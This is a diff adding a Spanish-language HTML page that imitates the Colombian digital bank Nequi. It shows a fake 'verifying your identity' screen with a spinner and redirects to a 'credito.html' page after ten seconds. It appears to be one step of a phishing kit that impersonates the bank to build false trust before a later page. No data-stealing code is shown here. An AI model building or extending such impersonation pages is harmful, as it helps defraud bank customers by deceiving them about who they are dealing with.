@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi - Verificando</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #21002b;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        .loading-container {
+            text-align: center;
+            padding: 20px;
+        }
+        .logo {
+            font-size: 42px;
+            font-weight: 700;
+            margin-bottom: 40px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+        h2 {
+            font-size: 26px;
+            margin-bottom: 12px;
+            font-weight: 500;
+        }
+        p {
+            font-size: 17px;
+            opacity: 0.85;
+            margin-bottom: 45px;
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.18);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+    <script>
+        setTimeout(() => {
+            window.location.href = 'credito.html';
+        }, 10000);
+    </script>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="logo">Nequi</div>
+        <h2>Verificando tu identidad...</h2>
+        <p>Esto solo tomará unos segundos</p>
+        <div class="spinner"></div>
+    </div>
+</body>
+</html>
